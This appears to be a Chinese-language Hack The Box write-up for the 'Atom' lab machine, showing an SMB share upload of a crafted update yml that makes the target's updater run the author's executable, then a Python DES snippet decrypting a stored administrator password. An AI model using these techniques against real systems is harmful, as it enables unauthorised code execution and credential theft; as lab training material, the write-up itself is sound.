+++
ShowToc = true
TocOpen = true
title = '0X033 Atom'
date = 2024-10-11T14:25:59+08:00
draft = false
private = true
show_reading_time = true
categories = 'HTB'
+++



# 端口扫描

![](/htb_img/WEBRESOURCE8b12b40668a685aaf03708f82a1327faimage.png)

![](/htb_img/WEBRESOURCE838d3d2c7c7be70a575948e081b49644image.png)

![](/htb_img/WEBRESOURCEf47224e81e57676fb1dc66b138668843image.png)

# 获取立足点

从端口开放情况来看，值得关注的点有：smb、redis、5985、80、443

先看smb:

![](/htb_img/WEBRESOURCEf0126d08eed606a7b2849f6baa4b2eb1image.png)

这里的内容，似乎在说，把程序放在这个目录，会自动运行：

![](/htb_img/WEBRESOURCE83261bfc23c13a3b3e76b0efea015b67image.png)

创建者Pages

![](/htb_img/WEBRESOURCEa81fdd7469055ca0d7cfaa9467a380b7image.png)

看看redis呢：

好像不行，没有未授权：

![](/htb_img/WEBRESOURCE8fc7da8c0119ea9131f9d3f0407ce0cfimage.png)

web方面，443和80页面一样：

发现文件，下载：

![](/htb_img/WEBRESOURCE4dda52a834bc2cb9dab0160b6a02b2b1image.png)

smb确实有写入权限：

![](/htb_img/WEBRESOURCE7924124077b02f05625e98a0b4b4984bimage.png)

程序看起来没有什么特别的，逆向看看把：

好像没逆向出来，有点尴尬：

![](/htb_img/WEBRESOURCE489df158a57e08c89bb85f55c6b06d6bimage.png)

抓包看看了：

发现dns查询，添加hosts抓取tun0：

![](/htb_img/WEBRESOURCE06ea8bc4271baa0819b7b662b66ad474image.png)

然后大概了解一下，程序通过访问目标上的yml文件，然后根据yml文件的内容，来尝试更新软件，然后结合刚刚PDF的内容，我们可以上传一个yml文件，指向我们的exe程序，就可以尝试getshell了：

计算一下值：

sha512sum "8'889.exe" | cut -d ' ' -f1 | xxd -r -p | base64 -w0

jJ7y5xvMF62HF3VmIQOFMpTogFyyYLl04zditACTK5L0j9CMQRHaC7OuI0mWeRI09tE0zOMTKienCmBNJqn+fA==

![](/htb_img/WEBRESOURCEc521913fef8b1266a49fa85f4714dfd3image.png)

yml文件内容如下：

```
version: 1.0.1
files:
 - url: 8'889.exe
   sha512: jJ7y5xvMF62HF3VmIQOFMpTogFyyYLl04zditACTK5L0j9CMQRHaC7OuI0mWeRI09tE0zOMTKienCmBNJqn+fA==
   size: 73802
path: 8'889.exe
sha512: jJ7y5xvMF62HF3VmIQOFMpTogFyyYLl04zditACTK5L0j9CMQRHaC7OuI0mWeRI09tE0zOMTKienCmBNJqn+fA==
```

上传上去：

![](/htb_img/WEBRESOURCE26c3e9d4e1f57f30832dbd954920d0b7image.png)

运行程序，稍等一会儿：

![](/htb_img/WEBRESOURCEc44dd7574a28995b6aca1df949a99887image.png)

# 提权

看起来不像是很容易提权的样子：

![](/htb_img/WEBRESOURCEd87c5953c66172c492b88382609a47c1image.png)

winpess也没有什么有效的内容：

![](/htb_img/WEBRESOURCE3dacc565a5b978b60081a72f9966c6e7image.png)

只能接着信息收集了：

读取redis密码：

![](/htb_img/WEBRESOURCE9371a9290cdc932383fd611ed2f26509image.png)

可以登录：

![](/htb_img/WEBRESOURCEe23718bcc883ec29c5825c7d37df5453image.png)

发现密码，这是[https://www.exploit-db.com/exploits/49409](https://www.exploit-db.com/exploits/49409)进行解密：

![](/htb_img/WEBRESOURCE259b26d1e0869ce372c25a66d3afca33image.png)

[kidvscat_admin_@123](http://kidvscat_admin_@123)

```
>>> import base64
>>> from des import *
>>> hash = base64.b64decode('Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi'.encode('utf-8'))
>>> key = DesKey(b"7ly6UznJ")
>>> print(key.decrypt(hash,initial=b"XuVUm5fR",padding=True).decode('utf-8'))
kidvscat_admin_@123
```

![](/htb_img/WEBRESOURCEfb544a44d67f6d0fb952805d848be0a7image.png)

![](/htb_img/WEBRESOURCEdf522e2408c893059524363c09e1a52eimage.png)